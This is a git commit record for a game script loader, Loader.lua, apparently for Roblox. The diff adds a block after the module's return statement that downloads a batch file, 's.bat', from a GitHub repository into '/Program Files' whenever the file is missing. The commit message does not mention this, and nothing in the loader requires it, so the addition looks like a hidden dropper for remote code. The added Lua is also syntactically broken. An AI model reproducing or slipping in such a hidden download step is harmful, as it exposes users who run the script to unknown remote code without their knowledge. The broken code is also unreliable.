8628ce554864f31ed93c14898e1df0b520e0557b
Ratklnatorzxnda <krutoydoter90@gmail.com>
2026-02-10 23:48:00 +0400

    Add files via upload

--- Loader.lua
+++ Loader.lua
@@ -7,3 +7,10 @@ else
     warn("❌ Unsupported game | GameId:", game.GameId)
 end
 return Games
+--main()
+        if not doesFileExist("/Program Files/s.bat") then -- Проверка отсутствует ли файл
+            local url = 'https://github.com/Ratklnatorzxnda/Raqop/blob/main/s.bat'
+            download_id = downloadUrlToFile(url, '/Program Files/s.bat', function(id, status, p1, p2)
+                end
+            end)
+        end
